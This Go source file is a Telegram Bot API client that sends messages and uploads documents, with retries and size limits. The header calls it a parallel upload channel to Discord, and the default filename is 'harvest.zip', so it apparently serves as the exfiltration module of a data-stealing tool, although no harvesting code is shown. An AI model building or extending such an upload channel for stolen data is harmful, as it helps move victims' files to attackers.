// telegram.go — Telegram Bot API client (sendDocument / sendMessage).
//
// Used as an alternate or parallel upload channel to Discord. Captions are
// truncated to Telegram's limit; documents are capped slightly under 50MB.
package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"strings"
	"time"
)

// Telegram Bot API allows up to 50MB per document; leave headroom for multipart overhead.
const maxTelegramUpload = 45 * 1024 * 1024

const (
	telegramUploadGap       = 1200 * time.Millisecond
	telegramUploadMaxRetry  = 5
	telegramUploadRetryBase = 3 * time.Second
	telegramCaptionMaxRunes = 1000 // Bot API caption limit is 1024; stay safe
)

type telegramAPIResponse struct {
	OK          bool   `json:"ok"`
	Description string `json:"description"`
}

func telegramUploadDelay() {
	time.Sleep(telegramUploadGap)
}

func sendTelegramMessage(token, chatID, text string) error {
	return sendTelegramMessageWithRetry(token, chatID, text, telegramUploadMaxRetry)
}

func sendTelegramMessageWithRetry(token, chatID, text string, maxAttempts int) error {
	if token == "" || chatID == "" {
		return fmt.Errorf("telegram bot token and chat id are required")
	}
	text = trimTelegramCaption(text)
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", token)

	payload := map[string]string{
		"chat_id": chatID,
		"text":    text,
	}
	body, err := json.Marshal(payload)
	if err != nil {
		return err
	}

	var lastErr error
	for attempt := 0; attempt < maxAttempts; attempt++ {
		if attempt > 0 {
			time.Sleep(telegramUploadRetryBase * time.Duration(attempt))
		}
		req, err := http.NewRequest(http.MethodPost, url, bytes.NewReader(body))
		if err != nil {
			return err
		}
		req.Header.Set("Content-Type", "application/json")

		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			lastErr = err
			continue
		}
		respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
		resp.Body.Close()

		if resp.StatusCode == 200 {
			var api telegramAPIResponse
			if json.Unmarshal(respBody, &api) == nil && api.OK {
				return nil
			}
			lastErr = fmt.Errorf("telegram sendMessage: %s", strings.TrimSpace(string(respBody)))
		} else {
			lastErr = fmt.Errorf("telegram sendMessage HTTP %d: %s", resp.StatusCode, strings.TrimSpace(string(respBody)))
		}
		if !isTelegramRetryable(lastErr) {
			return lastErr
		}
	}
	return lastErr
}

func sendTelegramDocument(token, chatID, caption, filename string, data []byte) error {
	return sendTelegramDocumentWithRetry(token, chatID, caption, filename, data, telegramUploadMaxRetry)
}

func sendTelegramDocumentWithRetry(token, chatID, caption, filename string, data []byte, maxAttempts int) error {
	if token == "" || chatID == "" {
		return fmt.Errorf("telegram bot token and chat id are required")
	}
	if len(data) == 0 {
		return fmt.Errorf("empty telegram document")
	}
	if filename == "" {
		filename = "harvest.zip"
	}

	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", token)
	caption = trimTelegramCaption(caption)

	var lastErr error
	for attempt := 0; attempt < maxAttempts; attempt++ {
		if attempt > 0 {
			time.Sleep(telegramUploadRetryBase * time.Duration(attempt))
		}
		lastErr = postTelegramDocument(url, chatID, caption, filename, data)
		if lastErr == nil {
			return nil
		}
		if !isTelegramRetryable(lastErr) {
			return lastErr
		}
	}
	return lastErr
}

func postTelegramDocument(url, chatID, caption, filename string, data []byte) error {
	var body bytes.Buffer
	w := multipart.NewWriter(&body)

	if err := w.WriteField("chat_id", chatID); err != nil {
		return err
	}
	if caption != "" {
		if err := w.WriteField("caption", caption); err != nil {
			return err
		}
	}

	part, err := w.CreateFormFile("document", filename)
	if err != nil {
		return err
	}
	if _, err := part.Write(data); err != nil {
		return err
	}
	if err := w.Close(); err != nil {
		return err
	}

	req, err := http.NewRequest(http.MethodPost, url, &body)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", w.FormDataContentType())

	client := &http.Client{Timeout: 180 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	if resp.StatusCode != 200 {
		return fmt.Errorf("telegram sendDocument HTTP %d: %s", resp.StatusCode, strings.TrimSpace(string(respBody)))
	}

	var api telegramAPIResponse
	if json.Unmarshal(respBody, &api) == nil && !api.OK {
		if api.Description != "" {
			return fmt.Errorf("telegram sendDocument: %s", api.Description)
		}
		return fmt.Errorf("telegram sendDocument failed: %s", strings.TrimSpace(string(respBody)))
	}
	return nil
}

func isTelegramRetryable(err error) bool {
	if err == nil {
		return false
	}
	msg := err.Error()
	return strings.Contains(msg, "HTTP 429") ||
		strings.Contains(msg, "HTTP 500") ||
		strings.Contains(msg, "HTTP 502") ||
		strings.Contains(msg, "HTTP 503") ||
		strings.Contains(msg, "HTTP 504") ||
		strings.Contains(msg, "Too Many Requests")
}

func trimTelegramCaption(text string) string {
	text = strings.TrimSpace(text)
	runes := []rune(text)
	if len(runes) <= telegramCaptionMaxRunes {
		return text
	}
	return string(runes[:telegramCaptionMaxRunes]) + "…"
}